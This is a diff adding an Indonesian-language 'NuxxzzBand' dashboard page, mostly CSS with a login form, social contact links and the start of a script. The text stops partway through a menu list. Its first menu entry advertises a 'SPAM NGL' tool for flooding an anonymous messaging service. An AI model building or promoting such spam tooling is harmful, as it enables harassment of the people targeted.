@@ -1,0 +1,2112 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NuxxzzBand - Dashboard</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@300;400;500;600;700&family=Orbitron:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <style>
+        * { 
+            margin: 0; 
+            padding: 0; 
+            box-sizing: border-box; 
+        }
+
+        body {
+            font-family: 'Rajdhani', sans-serif;
+            background: #000;
+            color: #fff;
+            overflow-x: hidden;
+            position: relative;
+            font-size: 15px;
+            line-height: 1.5;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+
+        /* Login Page - Default TAMPIL */
+        .login-page {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000;
+            z-index: 3000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        /* Dashboard Elements - Default TIDAK TAMPIL */
+        .photo-carousel-container,
+        .dashboard-section,
+        .taskbar-container,
+        .customers-modal {
+            display: none;
+        }
+
+        /* Ketika login berhasil */
+        .login-hidden .login-page {
+            display: none;
+        }
+
+        .login-hidden .photo-carousel-container,
+        .login-hidden .dashboard-section,
+        .login-hidden .taskbar-container {
+            display: block;
+        }
+
+        /* ============ LOGIN PAGE STYLES ============ */
+        .particles-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 1;
+            transform: rotate(45deg);
+            pointer-events: none;
+        }
+        
+        .particle {
+            position: absolute;
+            top: -10%;
+            left: 50%;
+            width: 100px;
+            height: 2px;
+            background: linear-gradient(90deg, #fff, transparent);
+            border-radius: 50%;
+            box-shadow: 0 0 0 4px rgba(255, 255, 255, 0.1);
+            animation: meteor 3s linear infinite;
+            opacity: 0;
+        }
+        
+        .particle::before {
+            content: '';
+            position: absolute;
+            transform: translateY(-50%);
+            top: 50%;
+            width: 300px;
+            height: 1px;
+            background: linear-gradient(90deg, #fff, transparent);
+        }
+        
+        @keyframes meteor {
+            0% { transform: rotate(180deg) translateX(0); opacity: 1; }
+            70% { opacity: 1; }
+            100% { transform: rotate(180deg) translateX(-1000px); opacity: 0; }
+        }
+        
+        .login-wrapper {
+            position: relative;
+            z-index: 10;
+            width: 100%;
+            max-width: 450px;
+            padding: 20px;
+        }
+        
+        .login-container {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(20px);
+            border-radius: 20px;
+            padding: 35px 30px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.7);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .login-container::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 3px;
+            background: linear-gradient(to right, #666, #ccc, #666);
+        }
+        
+        /* Video container dengan border animasi */
+        .video-wide-container {
+            width: 100%;
+            height: 160px;
+            margin: 0 auto 25px auto;
+            position: relative;
+            border-radius: 20px;
+            overflow: hidden;
+            animation: borderMove 3s linear infinite;
+            background: linear-gradient(90deg, #000, #fff, #000, #fff, #000);
+            background-size: 300% 100%;
+            padding: 3px;
+        }
+        
+        .video-wide {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            border-radius: 17px;
+            background: #000;
+        }
+        
+        .video-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.2);
+            border-radius: 17px;
+        }
+        
+        @keyframes borderMove {
+            0% {
+                background-position: 0% 0%;
+            }
+            100% {
+                background-position: 300% 0%;
+            }
+        }
+        
+        /* Text Animation Container */
+        .text-animation-container {
+            position: relative;
+            min-height: 90px;
+            margin-bottom: 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+        }
+
+        .text-set {
+            position: absolute;
+            width: 100%;
+            opacity: 0;
+            display: none;
+        }
+
+        .text-set.active {
+            opacity: 1;
+            display: block;
+        }
+
+        /* Glitch text animation */
+        .glitch-text {
+            font-family: 'Orbitron', monospace;
+            font-size: 28px;
+            font-weight: 900;
+            position: relative;
+            text-transform: uppercase;
+            letter-spacing: 0.1em;
+            color: white;
+            text-shadow: 0 0 10px rgba(255, 255, 255, 0.5);
+            overflow: hidden;
+            margin-bottom: 8px;
+            text-align: center;
+        }
+
+        .char {
+            display: inline-block;
+            opacity: 0;
+            transform: translateY(50px);
+            animation: charFlyIn 0.5s ease-out forwards;
+        }
+
+        @keyframes charFlyIn {
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .char.out {
+            animation: charFlyOut 0.3s ease-in forwards;
+        }
+
+        @keyframes charFlyOut {
+            to {
+                opacity: 0;
+                transform: translateY(-30px) rotateX(90deg);
+            }
+        }
+
+        /* Glitch effect */
+        .glitch-text::before,
+        .glitch-text::after {
+            content: attr(data-text);
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+        }
+
+        .glitch-text::before {
+            animation: glitch-1 0.5s infinite;
+            color: #b19cd9;
+            z-index: -1;
+            text-shadow: -2px 0 #b19cd9;
+        }
+
+        .glitch-text::after {
+            animation: glitch-2 0.5s infinite;
+            color: white;
+            z-index: -1;
+            text-shadow: 2px 0 #8a6bc9;
+        }
+
+        @keyframes glitch-1 {
+            0%, 100% { clip-path: inset(0 0 0 0); transform: translate(0); }
+            20% { clip-path: inset(33% 0 33% 0); transform: translate(-2px); }
+            40% { clip-path: inset(66% 0 0 0); transform: translate(2px); }
+            60% { clip-path: inset(0 0 66% 0); transform: translate(1px); }
+            80% { clip-path: inset(25% 0 50% 0); transform: translate(-1px); }
+        }
+
+        @keyframes glitch-2 {
+            0%, 100% { clip-path: inset(0 0 0 0); transform: translate(0); }
+            20% { clip-path: inset(50% 0 25% 0); transform: translate(2px); }
+            40% { clip-path: inset(0 0 75% 0); transform: translate(-2px); }
+            60% { clip-path: inset(75% 0 0 0); transform: translate(-1px); }
+            80% { clip-path: inset(40% 0 40% 0); transform: translate(1px); }
+        }
+        
+        .tagline {
+            color: rgba(255, 255, 255, 0.6);
+            font-size: 0.85rem;
+            letter-spacing: 1px;
+            text-align: center;
+        }
+        
+        /* Form inputs */
+        .input-group {
+            margin-bottom: 25px;
+            position: relative;
+        }
+        
+        .input-group i {
+            position: absolute;
+            left: 18px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #aaa;
+            font-size: 1.1rem;
+            transition: all 0.3s ease;
+            z-index: 2;
+        }
+        
+        .input-wrapper {
+            position: relative;
+            border-radius: 15px;
+            overflow: hidden;
+        }
+        
+        .input-group input {
+            width: 100%;
+            padding: 16px 55px 16px 55px;
+            background: rgba(0, 0, 0, 0.25);
+            border: 2px solid rgba(255, 255, 255, 0.2);
+            border-radius: 15px;
+            color: #fff;
+            font-size: 1rem;
+            transition: all 0.3s ease;
+            position: relative;
+            z-index: 2;
+        }
+        
+        .input-group input:focus {
+            outline: none;
+            border-color: #fff;
+            background: rgba(0, 0, 0, 0.35);
+        }
+        
+        .input-group input::placeholder {
+            color: rgba(255, 255, 255, 0.4);
+        }
+        
+        .input-group input:focus::placeholder {
+            color: rgba(255, 255, 255, 0.6);
+        }
+        
+        .input-group input:focus + i {
+            color: #fff;
+        }
+        
+        /* Password toggle eye */
+        .password-toggle {
+            position: absolute;
+            right: 18px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #aaa;
+            font-size: 1rem;
+            cursor: pointer;
+            z-index: 3;
+            transition: all 0.3s ease;
+        }
+        
+        .password-toggle:hover {
+            color: #fff;
+        }
+        
+        /* Login button */
+        .login-btn {
+            width: 100%;
+            padding: 16px;
+            background: rgba(255, 255, 255, 0.1);
+            border: 2px solid rgba(255, 255, 255, 0.25);
+            border-radius: 15px;
+            color: #fff;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            letter-spacing: 1.5px;
+            margin-top: 5px;
+            margin-bottom: 25px;
+            -webkit-tap-highlight-color: transparent;
+        }
+        
+        .login-btn:hover {
+            background: rgba(255, 255, 255, 0.15);
+            border-color: rgba(255, 255, 255, 0.35);
+            transform: translateY(-3px);
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.4);
+        }
+        
+        .login-btn:active {
+            transform: translateY(0);
+        }
+        
+        .login-btn i {
+            margin-right: 8px;
+        }
+        
+        /* Telegram link section */
+        .telegram-section {
+            text-align: center;
+            padding-top: 20px;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .telegram-link {
+            display: inline-flex;
+            align-items: center;
+            color: rgba(255, 255, 255, 0.8);
+            text-decoration: none;
+            font-size: 0.9rem;
+            transition: all 0.3s ease;
+        }
+        
+        .telegram-link:hover {
+            color: #fff;
+        }
+        
+        .telegram-icon {
+            font-size: 1.1rem;
+            margin-right: 8px;
+            color: #fff;
+            filter: drop-shadow(0 0 2px rgba(255, 255, 255, 0.5));
+        }
+        
+        .telegram-text {
+            margin-right: 5px;
+            color: rgba(255, 255, 255, 0.6);
+        }
+        
+        .click-here {
+            color: #fff;
+            text-decoration: underline;
+            font-weight: 500;
+        }
+        
+        .telegram-link:hover .click-here {
+            color: #fff;
+            text-decoration: underline;
+        }
+
+        /* ============ DASHBOARD STYLES ============ */
+        /* Photo Carousel */
+        .photo-carousel-container {
+            position: relative;
+            width: 100%;
+            max-width: 1200px;
+            margin: 40px auto 40px;
+            overflow: hidden;
+            border-radius: 20px;
+            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.8);
+            height: 250px;
+        }
+
+        .photo-carousel {
+            display: flex;
+            transition: transform 0.8s cubic-bezier(0.4, 0.0, 0.2, 1);
+            height: 100%;
+            position: relative;
+            z-index: 1;
+        }
+
+        .photo-slide {
+            min-width: 100%;
+            height: 100%;
+            position: relative;
+            overflow: hidden;
+            flex-shrink: 0;
+        }
+
+        .photo-slide img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            transition: transform 0.8s ease;
+        }
+
+        .photo-slide:hover img {
+            transform: scale(1.05);
+        }
+
+        .photo-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(45deg, rgba(0,0,0,0.7), rgba(0,0,0,0.3));
+            display: flex;
+            align-items: flex-end;
+            padding: 30px;
+        }
+
+        .photo-content {
+            max-width: 600px;
+        }
+
+        .photo-title {
+            font-family: 'Orbitron', monospace;
+            font-size: 2.5rem;
+            font-weight: 900;
+            color: white;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            line-height: 1.1;
+            margin-bottom: 10px;
+            text-shadow: 0 2px 10px rgba(0, 0, 0, 0.7);
+        }
+
+        .photo-subtitle {
+            font-family: 'Rajdhani', sans-serif;
+            font-size: 1.1rem;
+            font-weight: 500;
+            color: rgba(255, 255, 255, 0.8);
+            letter-spacing: 1px;
+        }
+
+        /* Dashboard Section */
+        .dashboard-section {
+            padding: 40px 20px 100px;
+            max-width: 100%;
+            margin: 0 auto;
+        }
+
+        .section-title {
+            font-family: 'Orbitron', monospace;
+            font-size: 2rem;
+            font-weight: 900;
+            text-align: center;
+            margin-bottom: 40px;
+            color: white;
+            text-transform: uppercase;
+            position: relative;
+        }
+
+        .section-title::after {
+            content: '';
+            position: absolute;
+            bottom: -10px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 100px;
+            height: 3px;
+            background: linear-gradient(to right, #666, #ccc, #666);
+        }
+
+        /* Carousel Cards */
+        .carousel-container {
+            position: relative;
+            width: 100%;
+            margin-bottom: 60px;
+        }
+
+        .carousel-wrapper {
+            position: relative;
+            width: 100%;
+            padding: 20px 0;
+            cursor: grab;
+            overflow: hidden;
+        }
+
+        .carousel-wrapper:active {
+            cursor: grabbing;
+        }
+
+        .carousel-track {
+            display: flex;
+            transition: transform 0.5s cubic-bezier(0.4, 0.0, 0.2, 1);
+        }
+        
+        /* Card Styles */
+        .uiverse-card {
+            width: 300px;
+            flex-shrink: 0;
+            border-radius: 20px;
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(20px);
+            padding: 5px;
+            overflow: hidden;
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.7);
+            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            cursor: pointer;
+            position: relative;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            margin-right: 20px;
+        }
+
+        .uiverse-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background: linear-gradient(to right, #666, #ccc, #666);
+        }
+
+        .uiverse-card:hover {
+            transform: translateY(-10px) scale(1.03);
+            background: rgba(255, 255, 255, 0.08);
+            box-shadow: 
+                0 15px 30px rgba(0, 0, 0, 0.9),
+                0 0 20px rgba(255, 255, 255, 0.1);
+        }
+
+        .uiverse-card .top-section {
+            height: 160px;
+            border-radius: 15px;
+            display: flex;
+            flex-direction: column;
+            background: rgba(0, 0, 0, 0.3);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .uiverse-card .top-section .border {
+            border-bottom-right-radius: 10px;
+            height: 30px;
+            width: 130px;
+            background: rgba(0, 0, 0, 0.5);
+            position: relative;
+            transform: skew(-40deg);
+            box-shadow: -10px -10px 0 0 rgba(0, 0, 0, 0.5);
+        }
+
+        .uiverse-card .top-section .icons {
+            position: absolute;
+            top: 0;
+            width: 100%;
+            height: 30px;
+            display: flex;
+            justify-content: space-between;
+            padding: 8px 15px;
+        }
+
+        .uiverse-card .top-section .tool-icon {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 48px;
+            color: #aaa;
+            transition: all 0.4s ease;
+        }
+
+        .uiverse-card:hover .top-section .tool-icon {
+            color: white;
+            transform: translate(-50%, -50%) scale(1.1);
+        }
+
+        .uiverse-card .bottom-section {
+            margin-top: 15px;
+            padding: 10px 5px;
+        }
+
+        .uiverse-card .bottom-section .title {
+            display: block;
+            font-size: 18px;
+            font-weight: bolder;
+            color: white;
+            text-align: center;
+            letter-spacing: 2px;
+            margin-bottom: 10px;
+        }
+
+        .uiverse-card .bottom-section .description {
+            color: rgba(255, 255, 255, 0.6);
+            text-align: center;
+            font-size: 14px;
+            margin-bottom: 15px;
+            line-height: 1.4;
+        }
+
+        .uiverse-card .bottom-section .row {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 20px;
+        }
+
+        .uiverse-card .bottom-section .row .item {
+            flex: 1;
+            text-align: center;
+            padding: 5px;
+            color: rgba(255, 255, 255, 0.6);
+        }
+
+        .uiverse-card .bottom-section .row .item .big-text {
+            font-size: 12px;
+            display: block;
+            font-weight: bold;
+        }
+
+        .uiverse-card .bottom-section .row .item:nth-child(2) {
+            border-left: 1px solid rgba(255, 255, 255, 0.1);
+            border-right: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .uiverse-card .bottom-section .card-cta {
+            padding: 12px 25px;
+            background: rgba(255, 255, 255, 0.1);
+            border: 2px solid rgba(255, 255, 255, 0.2);
+            border-radius: 15px;
+            color: white;
+            font-weight: 600;
+            text-transform: uppercase;
+            cursor: pointer;
+            transition: all 0.4s ease;
+            display: block;
+            margin: 15px auto 0;
+            font-size: 14px;
+            font-family: 'Orbitron', monospace;
+            width: 80%;
+            letter-spacing: 1.5px;
+            outline: none;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        .uiverse-card .bottom-section .card-cta:hover {
+            transform: translateY(-3px);
+            background: rgba(255, 255, 255, 0.15);
+            border-color: rgba(255, 255, 255, 0.3);
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.4);
+        }
+
+        .uiverse-card .bottom-section .card-cta:active {
+            transform: translateY(0);
+        }
+
+        .auto-slide-indicator {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 20px;
+        }
+
+        .indicator-dot {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.2);
+            transition: all 0.3s ease;
+            cursor: pointer;
+        }
+
+        .indicator-dot.active {
+            background: #ccc;
+            transform: scale(1.2);
+        }
+
+        /* Customers Modal - Header dengan Back */
+        .customers-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.95);
+            z-index: 2000;
+            backdrop-filter: blur(10px);
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .customers-modal.active {
+            display: flex;
+        }
+
+        .customers-container {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(20px);
+            border-radius: 20px;
+            padding: 0;
+            width: 100%;
+            max-width: 500px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.8);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .customers-container::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 3px;
+            background: linear-gradient(to right, #666, #ccc, #666);
+        }
+
+        /* Modal Header dengan Back */
+        .modal-header {
+            display: flex;
+            align-items: center;
+            padding: 20px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            background: rgba(0, 0, 0, 0.3);
+        }
+
+        .back-button {
+            background: none;
+            border: none;
+            color: #fff;
+            font-size: 20px;
+            cursor: pointer;
+            margin-right: 15px;
+            width: 40px;
+            height: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 10px;
+            transition: all 0.3s ease;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        .back-button:hover {
+            background: rgba(255, 255, 255, 0.1);
+        }
+
+        .modal-title {
+            font-family: 'Orbitron', monospace;
+            font-size: 1.5rem;
+            color: white;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+
+        .modal-content {
+            padding: 30px;
+            max-height: 60vh;
+            overflow-y: auto;
+        }
+
+        .modal-content::-webkit-scrollbar {
+            width: 6px;
+        }
+
+        .modal-content::-webkit-scrollbar-track {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 10px;
+        }
+
+        .modal-content::-webkit-scrollbar-thumb {
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 10px;
+        }
+
+        .customer-item {
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 15px;
+            padding: 20px;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            transition: all 0.3s ease;
+        }
+
+        .customer-item:hover {
+            background: rgba(255, 255, 255, 0.05);
+            border-color: rgba(255, 255, 255, 0.2);
+            transform: translateY(-3px);
+        }
+
+        .customer-icon {
+            width: 60px;
+            height: 60px;
+            border-radius: 12px;
+            background: rgba(255, 255, 255, 0.1);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 20px;
+            font-size: 28px;
+            color: #aaa;
+            flex-shrink: 0;
+        }
+
+        .customer-info {
+            flex: 1;
+        }
+
+        .customer-name {
+            font-family: 'Orbitron', monospace;
+            font-size: 1.2rem;
+            color: white;
+            margin-bottom: 8px;
+        }
+
+        .customer-desc {
+            color: rgba(255, 255, 255, 0.6);
+            font-size: 0.9rem;
+            margin-bottom: 12px;
+            line-height: 1.4;
+        }
+
+        .customer-link {
+            color: white;
+            text-decoration: none;
+            font-size: 0.9rem;
+            transition: all 0.3s ease;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            padding: 8px 16px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        .customer-link:hover {
+            color: #fff;
+            background: rgba(255, 255, 255, 0.15);
+            border-color: rgba(255, 255, 255, 0.3);
+        }
+
+        .customer-link:active {
+            transform: scale(0.98);
+        }
+
+        .customer-link i {
+            font-size: 0.9rem;
+        }
+
+        /* Taskbar */
+        .taskbar-container {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            z-index: 1000;
+        }
+
+        .button-container {
+            display: flex;
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(20px);
+            width: 380px;
+            height: 70px;
+            align-items: center;
+            justify-content: space-around;
+            border-radius: 20px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.7);
+        }
+
+        .button {
+            outline: 0 !important;
+            border: 0 !important;
+            width: 60px;
+            height: 60px;
+            border-radius: 15px;
+            background: rgba(255, 255, 255, 0.1);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: rgba(255, 255, 255, 0.8);
+            transition: all 0.4s ease;
+            cursor: pointer;
+            font-size: 24px;
+            border: 2px solid rgba(255, 255, 255, 0.2);
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        .button:hover {
+            transform: translateY(-5px);
+            background: rgba(255, 255, 255, 0.15);
+            color: white;
+            border-color: rgba(255, 255, 255, 0.3);
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.4);
+        }
+
+        .button:active {
+            transform: translateY(-2px);
+        }
+
+        .button.active {
+            background: rgba(255, 255, 255, 0.2);
+            color: white;
+            border-color: rgba(255, 255, 255, 0.4);
+        }
+
+        /* Message Styles */
+        .message {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: rgba(0, 0, 0, 0.9);
+            color: white;
+            padding: 12px 20px;
+            border-radius: 10px;
+            z-index: 1000;
+            animation: slideIn 0.3s ease;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            font-size: 0.85rem;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.5);
+        }
+
+        @keyframes slideIn {
+            from { transform: translateX(100%); opacity: 0; }
+            to { transform: translateX(0); opacity: 1; }
+        }
+
+        @keyframes slideOut {
+            from { transform: translateX(0); opacity: 1; }
+            to { transform: translateX(100%); opacity: 0; }
+        }
+
+        /* Photo Carousel Navigation */
+        .carousel-nav {
+            position: absolute;
+            top: 50%;
+            transform: translateY(-50%);
+            background: rgba(0, 0, 0, 0.5);
+            border: none;
+            color: white;
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            font-size: 20px;
+            z-index: 2;
+            transition: all 0.3s ease;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        .carousel-nav:hover {
+            background: rgba(0, 0, 0, 0.8);
+            transform: translateY(-50%) scale(1.1);
+        }
+
+        .carousel-nav.prev {
+            left: 20px;
+        }
+
+        .carousel-nav.next {
+            right: 20px;
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .photo-carousel-container { 
+                height: 200px; 
+                margin: 20px auto 30px;
+            }
+            .photo-title { font-size: 1.8rem; }
+            .photo-subtitle { font-size: 1rem; }
+            .uiverse-card { width: 280px; }
+            .button-container { width: 340px; height: 65px; }
+            .button { width: 55px; height: 55px; font-size: 22px; }
+            .customers-container { max-width: 90%; }
+            .customer-item { flex-direction: column; text-align: center; }
+            .customer-icon { margin-right: 0; margin-bottom: 15px; }
+            .carousel-nav { width: 40px; height: 40px; font-size: 18px; }
+            .carousel-nav.prev { left: 10px; }
+            .carousel-nav.next { right: 10px; }
+        }
+
+        @media (max-width: 480px) {
+            .photo-carousel-container { height: 180px; }
+            .photo-title { font-size: 1.5rem; }
+            .button-container { width: 320px; height: 60px; }
+            .button { width: 50px; height: 50px; font-size: 20px; }
+            .modal-content { padding: 20px; }
+            .customer-icon { width: 50px; height: 50px; font-size: 24px; }
+            .customer-name { font-size: 1.1rem; }
+            .modal-title { font-size: 1.3rem; }
+            .carousel-nav { width: 35px; height: 35px; font-size: 16px; }
+        }
+
+        /* Remove blue click effect */
+        * {
+            -webkit-tap-highlight-color: transparent !important;
+        }
+        
+        button, a, input {
+            -webkit-tap-highlight-color: transparent !important;
+            outline: none !important;
+        }
+        
+        button:focus, a:focus, input:focus {
+            outline: none !important;
+            box-shadow: none !important;
+        }
+    </style>
+</head>
+<body>
+    <!-- Partikel efek - Hanya di halaman login -->
+    <div class="particles-container" id="particles"></div>
+
+    <!-- Login Page -->
+    <div class="login-page" id="loginPage">
+        <div class="login-wrapper">
+            <div class="login-container">
+                <!-- Video dengan border animasi -->
+                <div class="video-wide-container">
+                    <video class="video-wide" id="videoWide" autoplay muted loop playsinline>
+                        <source src="https://files.catbox.moe/l2iszm.mp4" type="video/mp4">
+                        Browser Anda tidak mendukung tag video.
+                    </video>
+                    <div class="video-overlay"></div>
+                </div>
+                
+                <!-- Text Animation Container -->
+                <div class="text-animation-container">
+                    <div class="text-set active">
+                        <h1 class="glitch-text" data-text="RAMADEV TOOLS">Nuxxzz Band Tools</h1>
+                        <p class="tagline">Developer Access Portal</p>
+                    </div>
+                    <div class="text-set">
+                        <h1 class="glitch-text" data-text="ACCESS PORTAL">ACCESS PORTAL</h1>
+                        <p class="tagline">Secure System Interface</p>
+                    </div>
+                    <div class="text-set">
+                        <h1 class="glitch-text" data-text="WELCOME">WELCOME</h1>
+                        <p class="tagline">Gateway to Developer Tools</p>
+                    </div>
+                </div>
+                
+                <!-- Login form -->
+                <form id="loginForm">
+                    <div class="input-group">
+                        <div class="input-wrapper">
+                            <i class="fas fa-user"></i>
+                            <input type="text" id="username" placeholder="Username" required autofocus>
+                        </div>
+                    </div>
+                    
+                    <div class="input-group">
+                        <div class="input-wrapper">
+                            <i class="fas fa-lock"></i>
+                            <input type="password" id="password" placeholder="Password" required>
+                            <span class="password-toggle" id="passwordToggle">
+                                <i class="fas fa-eye"></i>
+                            </span>
+                        </div>
+                    </div>
+                    
+                    <button type="submit" class="login-btn">
+                        <i class="fas fa-sign-in-alt"></i> LOGIN
+                    </button>
+                    
+                    <!-- Telegram link section -->
+                    <div class="telegram-section">
+                        <a href="https://t.me/ibnuuu_23" target="_blank" class="telegram-link">
+                            <i class="fab fa-telegram telegram-icon"></i>
+                            <span class="telegram-text">Pengen akun ?</span>
+                            <span class="click-here">Click di sini</span>
+                        </a>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <!-- Main Dashboard -->
+    <section class="dashboard-section">
+        <h2 class="section-title">Dashboard</h2>
+        
+        <div class="photo-carousel-container">
+            <button class="carousel-nav prev" id="prevPhoto">‹</button>
+            <div class="photo-carousel" id="photoCarousel"></div>
+            <button class="carousel-nav next" id="nextPhoto">›</button>
+        </div>
+        
+        <div class="carousel-container">
+            <div class="carousel-wrapper" id="carouselWrapper">
+                <div class="carousel-track" id="carouselTrack"></div>
+            </div>
+            <div class="auto-slide-indicator" id="slideIndicator"></div>
+        </div>
+    </section>
+
+    <!-- Customers Modal -->
+    <div class="customers-modal" id="customersModal">
+        <div class="customers-container">
+            <div class="modal-header">
+                <button class="back-button" id="backButton">
+                    <i class="fas fa-arrow-left"></i>
+                </button>
+                <h2 class="modal-title">My Contacts</h2>
+            </div>
+            
+            <div class="modal-content">
+                <div class="customer-item">
+                    <div class="customer-icon">
+                        <i class="fab fa-telegram"></i>
+                    </div>
+                    <div class="customer-info">
+                        <div class="customer-name">Telegram</div>
+                        <div class="customer-desc">Join my Telegram channel for announcements and support</div>
+                        <a href="https://t.me/AiiStecu" target="_blank" class="customer-link">
+                            <i class="fas fa-external-link-alt"></i> Open Telegram
+                        </a>
+                    </div>
+                </div>
+                
+                <div class="customer-item">
+                    <div class="customer-icon">
+                        <i class="fab fa-tiktok"></i>
+                    </div>
+                    <div class="customer-info">
+                        <div class="customer-name">TikTok</div>
+                        <div class="customer-desc">Follow my TikTok account for updates and tutorials</div>
+                        <a href="https://tiktok.com/@nuxxzzstecu" target="_blank" class="customer-link">
+                            <i class="fas fa-external-link-alt"></i> Open TikTok
+                        </a>
+                    </div>
+                </div>
+                
+                <div class="customer-item">
+                    <div class="customer-icon">
+                        <i class="fab fa-whatsapp"></i>
+                    </div>
+                    <div class="customer-info">
+                        <div class="customer-name">WhatsApp</div>
+                        <div class="customer-desc">Contact me directly on WhatsApp for quick support</div>
+                        <a href="https://wa.me/6285188723105" target="_blank" class="customer-link">
+                            <i class="fas fa-external-link-alt"></i> Open WhatsApp
+                        </a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Taskbar -->
+    <div class="taskbar-container">
+        <div class="button-container">
+            <button class="button active" id="homeButton" title="Home">
+                <i class="fas fa-home"></i>
+            </button>
+            <button class="button" id="customersButton" title="Contacts">
+                <i class="fas fa-users"></i>
+            </button>
+            <button class="button" id="logoutButton" title="Logout">
+                <i class="fas fa-sign-out-alt"></i>
+            </button>
+        </div>
+    </div>
+
+    <script>
+        // Data untuk aplikasi
+        const photoData = [
+            {
+                id: 1,
+                imageUrl: 'https://files.catbox.moe/9wrrby.jpg',
+                title: 'Nuxxzz Band',
+                subtitle: 'Developer Access Portal'
+            },
+            {
+                id: 2,
+                imageUrl: 'https://files.catbox.moe/cfllg0.jpg',
+                title: 'ACCESS PORTAL',
+                subtitle: 'Secure System Interface'
+            },
+            {
+                id: 3,
+                imageUrl: 'https://files.catbox.moe/8nrogd.jpeg',
+                title: 'WELCOME',
+                subtitle: 'Gateway to Developer Tools'
+            }
+        ];
+
+        const menuData = [
+            {
+                id: 1,
+                title: 'SPAM NGL',
+                description: 'Tool untuk spam NGL dengan berbagai opsi dan konfigurasi.',
+                icon: 'fas fa-envelope',
+                stats: ['AUTO', 'CUSTOM', 'FAST'],
+                link: '/ngl-spam'
+            },
+            {
